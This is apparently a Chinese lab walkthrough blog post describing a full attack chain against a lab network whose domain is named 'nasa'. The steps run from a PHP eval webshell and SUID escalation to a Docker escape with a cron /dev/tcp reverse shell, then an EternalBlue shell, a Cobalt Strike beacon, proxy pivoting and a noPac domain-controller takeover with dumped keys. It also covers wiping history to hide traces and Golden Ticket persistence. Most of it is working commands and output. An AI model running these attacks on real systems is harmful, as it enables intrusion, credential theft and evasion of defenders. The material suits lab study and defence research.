---
title: "从外网打点到渗透内网域控 NASA"
date: 2026-04-25T22:00:00+08:00
draft: false
author: "偶记"
categories: ["内网渗透"]
tags: ["域渗透", "noPac", "EternalBlue", "内网穿透", "Docker逃逸", "SUID提权"]
---


```
                   ┌─────────────────┐
                   │     Ubuntu      │
                   │ 192.168.226.158 │
                   └─────────────────┘
                             │
               ┌─────────────┼─────────────┐
               │                           │
               ▼                           ▼
   ┌────────────────────┐      ┌────────────────────┐
   │      win2003       │      │       win7         │
   │ 192.168.174.136    │      │ 192.168.174.135    │
   │ 10.10.10.137       │      │ 10.10.10.142       │
   └────────────────────┘      └────────────────────┘
                                        │
                                        ▼
                 ┌───────────────────────┴───────────────────────┐
                 │                                               │
                 ▼                                               ▼
   ┌─────────────────────────┐                   ┌─────────────────────────┐
   │     19server-ad01       │                   │     19server-ad02       │
   │     10.10.10.140        │                   │     10.10.10.139        │
   └─────────────────────────┘                   └─────────────────────────┘
```

## 外网打点
### 目录扫描
[http://192.168.226.161/admin/](http://192.168.226.161/install/)

[http://192.168.226.161/install/](http://192.168.226.161/install/)

<font style="color:rgb(0, 0, 0);">./install/install.lock</font>

### 代码审计
[https://www.jianshu.com/p/d5a180ebeb7e](https://www.jianshu.com/p/d5a180ebeb7e)

nday 发现任意文件删除

admin/module/db.php 第 168-177 行的 case 'del': 分支。

代码注入

`../../install/index.php`

### GetShell
`xy_');eval($_POST[cmd]);?>//`

![](https://cdn.nlark.com/yuque/0/2026/png/36155031/1778779982262-5b38d848-9b1d-4a71-8674-92f5bbdc38e1.png)

[http://192.168.226.158/config.php](http://192.168.226.158/config.php)

## SUID提权
当一个程序拥有 SUID 且 owner 是 root 时： 普通用户运行该程序时，程序会 以 root 身份执行

上传linEnum脚本

`touch test`

`find test -exec whoami \;`

## 弹容器 Shell
```shell
┌──(root㉿kali)-[~]
└─# msfvenom -p linux/x64/meterpreter/reverse_tcp \
LHOST=192.168.226.128 \
LPORT=6666 \
-f elf > moon.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload  

┌──(root㉿kali)-[~]
└─# msfconsole
Metasploit tip: Start commands with a space to avoid saving them to history
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.226.128
LHOST => 192.168.226.128
msf exploit(multi/handler) > set LPORT 6666
LPORT => 6666
msf exploit(multi/handler) > run
# 监听已开启，等待靶机运行马子即可上线
[*] Started reverse TCP handler on 192.168.226.128:6666 
[*] Sending stage (3090404 bytes) to 192.168.178.140
[*] Meterpreter session 1 opened (192.168.226.128:6666 -> 192.168.178.140:52464) at 2026-03-11 13:51:56 -0400

meterpreter > getuid
Server username: root
meterpreter > 

shell 进入靶机终端
想回到 Meterpreter 就直接输入 exit
```

```shell
把elf马子传上来
chmod +x moon.elf
touch test
find test -exec ./moon.elf \;
```

## Docker 逃逸
`ls /.dockerenv`

**把宿主机的硬盘（文件系统）挂载到容器里的一个目录，然后通过 chroot 把这个目录变成容器的"新根目录"**

```shell
┌──(root㉿kali)-[~]
└─# nc -lnvp 8888

listening on [any] 8888 ...
connect to [192.168.226.128] from (UNKNOWN) [192.168.226.129] 55464
bash: 无法设定终端进程组(3231): 对设备不适当的 ioctl 操作
bash: 此 shell 中无任务控制
root@ubuntu-virtual-machine:~# ls
```

```shell
meterpreter > shell
Process 107 created.
Channel 5 created.

// 添加 root 权限用户，为什么要新增新用户？
openssl passwd -1 -salt pingan pingan0409!!!
$1$pingan$l0v7nyxHDOuitwybLvvZ4.
echo 'pingan:$1$pingan$l0v7nyxHDOuitwybLvvZ4.:0:0:root:/root:/bin/bash' >> /etc/passwd

// 创建交互式shell，切换到新用户pingan
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.3$ su pingan
su pingan
Password: pingan0409!!! 

// 通过挂载进行 docker 逃逸
// 创建目录
root@683a11bdee30:/app/install# mkdir /pingantest
mkdir /pingantest
// 将宿主的目录挂载到新目录
root@683a11bdee30:/app/install# mount /dev/sda1 /pingantest
mount /dev/sda1 /pingantest
// 改变根目录
root@683a11bdee30:/app/install# chroot /pingantest
chroot /pingantest

// 反弹shell
root@683a11bdee30:/# echo '/bin/bash -i >& bash -i >&/dev/tcp/192.168.226.128/8888 0>&1' > /tmp/sec.sh && chmod +x /tmp/sec.sh && cat /tmp/sec.sh && echo '*/1 * * * * root bash /tmp/sec.sh' >>/etc/crontab
< '*/1 * * * * root bash /tmp/sec.sh' >>/etc/crontab
/bin/bash -i >& bash -i >&/dev/tcp/192.168.226.128/8888 0>&1
root@683a11bdee30:/# 
```


# 内网渗透
## 内网信息收集
`./fscan -h 192.168.226.0/24 -np -no -nopoc`



## win7
```bash
┌──(root㉿kali)-[~]
└─# msfconsole
msf > use exploit/windows # 只支持 x64
msf exploit(windows) > set RHOSTS 192.168.226.197
msf exploit(windows) > set LHOST 192.168.226.128
msf exploit(windows) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows) > set VERIFY_ARCH false          
msf exploit(windows) > set VERIFY_TARGET false
msf exploit(windows) > set TARGET 0
msf exploit(windows) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Meterpreter session 1 opened (192.168.226.128:4444 -> 192.168.226.197:49276) at 2026-04-09 11:42:23 -0400
[+] 192.168.226.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.226.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.226.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN7  192.168.226.128:4444 -> 192.168.226.197:49276 (192.168.226.197)

msf exploit(windows) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : WIN7
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : NASA
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter > 
[*] 192.168.226.197 - Meterpreter session 1 closed.  Reason: Died


Win7（192.168.226.197）已经成功拿下 SYSTEM 权限的 Meterpreter 会话！🎉
你现在已经在 NT AUTHORITY\SYSTEM 权限下了，这是 Windows 上最高的权限。

sysinfo                  # 查看系统信息
getuid                   # 确认权限（应该显示 SYSTEM）
getpid                   # 查看当前进程
ipconfig                 # 查看靶机网络信息
pwd                      # 当前目录
shell                    # 进入 cmd 命令行（可选，后面可以 exit 回来）

sessions -i id

后台会话（推荐，先切回 msf 主界面继续操作另一台）：meterpreter background
查看所有会话：msfsessions


```

```bash
meterpreter > upload /root/AAA/beacon_x64.exe C:\\Windows\\Temp\\beacon_x64.exe
[*] Uploading  : /root/beacon_x64.exe -> C:\Windows\Temp\beacon_x64.exe
[*] Uploaded 14.00 KiB of 14.00 KiB (100.0%): /root/beacon_x64.exe -> C:\Windows\Temp\beacon_x64.exe
[*] Completed  : /root/beacon_x64.exe -> C:\Windows\Temp\beacon_x64.exe

beacon_x64.exe
```

```bash
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks4 127.0.0.1 1080
```

```bash
# 添加路由部分
# autoroute 是 Meterpreter 的脚本，-s 10.10.10.0/24：告诉 Meterpreter，你希望访问这个子网。
meterpreter > run autoroute -s 10.10.10.0/24
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.10.10.0/255.255.255.0...
[+] Added route to 10.10.10.0/255.255.255.0 via 192.168.226.197
[*] Use the -p option to list all active routes
meterpreter > background
[*] Backgrounding session 1...
# 验证：所有发送到 10.10.10.0/24 的流量会通过 Session 1 这台跳板机。

use server/socks_proxy
msf auxiliary(server/socks_proxy) > route print
IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1

# 设置 SOCKS Proxy 部分

msf auxiliary(server/socks_proxy) > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > set VERSION 5
msf auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf auxiliary(server/socks_proxy) > set SRVPORT 9050
msf auxiliary(server/socks_proxy) > run
msf auxiliary(server/socks_proxy) > 

# 跳板建立验证，扫描网段内一个主机的445端口
┌──(root㉿kali)-[~]
└─# proxychains4 nmap -sT -Pn -n -p 445 10.10.10.140
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Nmap scan report for 10.10.10.140
Host is up (0.072s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds

```

## 域信息收集
域用户登录win7：`nasa\test,QWEasd!@#999`

win7：beacon> logonpasswords

beacon执行`shell ipconfig`发现还有一个网段：`10.10.10.0/24`

使用fscan进行探测`10.10.10.0/24`网段

```
[04/18 19:18:15] beacon> shell fscan2020.exe -h 10.10.10.0/24 -np -no
[04/18 19:18:15] [*] Tasked beacon to run: fscan2020.exe -h 10.10.10.0/24 -np -no
[04/18 19:18:15] [+] host called home, sent: 69 bytes
[04/18 19:18:25] [+] received output:


   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
10.10.10.142:135 open
10.10.10.140:135 open
10.10.10.140:80 open
10.10.10.137:135 open
10.10.10.137:80 open
10.10.10.140:445 open
10.10.10.140:443 open
10.10.10.141:135 open
10.10.10.137:445 open
10.10.10.142:445 open
10.10.10.141:445 open

[04/18 19:18:36] [+] received output:
10.10.10.142	MS17-010	(Windows 7 Ultimate 7601 Service Pack 1)
NetInfo:
[*]10.10.10.142
   [->]win7
   [->]10.10.10.142
   [->]192.168.226.197
NetInfo:
[*]10.10.10.140
   [->]ad01
   [->]10.10.10.140
NetInfo:
[*]10.10.10.137
   [->]win2003
   [->]10.10.10.137
   [->]192.168.226.144
10.10.10.137	MS17-010	(Windows Server 2003 3790 Service Pack 2)
NetInfo:
[*]10.10.10.141
   [->]ad02
   [->]10.10.10.141

[04/18 19:18:37] [+] received output:
WebTitle:http://10.10.10.140:80 403 None
WebTitle:http://10.10.10.137:80 200 None
```


## AD (noPac)
CVE-2021-42278 & CVE-2021-42287 攻击域控

**第一步：扫描目标是否 vulnerable（强烈建议先扫）**：

```
proxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140
```

如果显示 vulnerable，就可以继续 exploit。

**第二步：利用 noPac 提权（常见姿势）**

+ **获取高权限票据**：

```
proxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 --impersonate administrator
```

+ **直接拿 shell**：

```
proxychains4 python3 noPac.py Dnasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 --impersonate administrator -shell
```

+ **Dump hash（常见目标）**：

```
proxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 --impersonate administrator -dump
```

```bash
┌──(root㉿kali)-[~/noPac-main]
└─# proxychains4 python noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 -dc-host AD01 --impersonate administrator -dump
[proxychains] config file found: /etc/proxychains4.conf
AD01$:aes256-cts-hmac-sha1-96:5b99a71e5d0274f24153ce9c8e1d85417f6133e2403fa9a77d0015b5f7f7de09
AD01$:aes128-cts-hmac-sha1-96:8b2e6c80caea337d3d8e319fb91df611
AD01$:des-cbc-md5:d9f26d5879347fcd
AD02$:aes256-cts-hmac-sha1-96:3a6d1aaa79853b28a4e0c3bffa83213c2e46513b8ab90c2d52782fc6f31115e2
AD02$:aes128-cts-hmac-sha1-96:73eb19685f294c87d6b1c89230d9b1b9
AD02$:des-cbc-md5:928c675bf40ee319
WIN7$:aes256-cts-hmac-sha1-96:21dec920ffa03eaa7ea50570dff0c1de279e37de20d07e72cd6b8ccdecfc966d
WIN7$:aes128-cts-hmac-sha1-96:0d79ea7e2d31f323d8b15f70c563e3e8
WIN7$:des-cbc-md5:2fd3dcb6ba2685c2
WIN-1EASNY7BHEK$:aes256-cts-hmac-sha1-96:4952733c099698a5e14a7b10fd66598e8b4b9e8a14fd2440bfc3dda5d7f88e7e
WIN-1EASNY7BHEK$:aes128-cts-hmac-sha1-96:1b973d65577282faecfcc5185019d72c
WIN-1EASNY7BHEK$:des-cbc-md5:68adf132703162ae
```

```bash
后面那些报错都是 **noPac 工具在清理阶段** 产生的**非致命错误**，不会影响你已经拿到的 Administrator 票据（`.ccache` 文件）和完整 dump 的 hashes/keys。

### 1. 删除机器账户失败（最常见的那个）
[*] Attempting to del a computer with the name: WIN-1EASNY7BHEK$
[-] Delete computer WIN-1EASNY7BHEK$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!

**原因**：noPac 在攻击过程中临时创建了一个机器账户（WIN-1EASNY7BHEK$），用来 spoof sAMAccountName。攻击结束后尝试自动删除但清理失败。

**影响**：几乎没有影响。攻击已经成功，票据和 dump 都拿到了。

### 2. 停止 RemoteRegistry 服务失败

**原因**：noPac 为了 dump SAM/LSA/NTDS，临时启动了目标 DC 上的 RemoteRegistry 服务。停止时发现有其他服务依赖它。

**影响**：无影响。

### 3. Python Exception（Bad file descriptor）

**原因**：impacket 库在清理 Registry 对象时的资源释放问题，属于 Python + impacket 在异常退出或网络代理环境下的"噪音"错误。

**影响**：完全无影响。
```

## 痕迹清理

**删除临时计算机账户**（最重要）：

```bash
export KRB5CCNAME=administrator_AD01.nasa.gov.ccache
python3 -m impacket.ldap_shell nasa.gov/Administrator -dc-ip 10.10.10.140 -no-pass -k
# 在 shell 中执行：delete computer WIN-1EASNY7BHEK$
```

**清理本地痕迹**：

```bash
rm -f *.ccache
history -c && history -w
```

**后续持久化推荐**：
+ 使用 krbtgt hash 制作 **Golden Ticket**。
+ DCSync 持续同步哈希。
+ 避免直接修改普通用户密码（对已拿票据无效），真正有效的防守是重置 krbtgt 密码两次 + 打补丁 + 关闭 MachineAccountQuota。

**声明**：本文仅用于学习和靶场复现，请在授权环境下进行测试，严禁用于非法用途。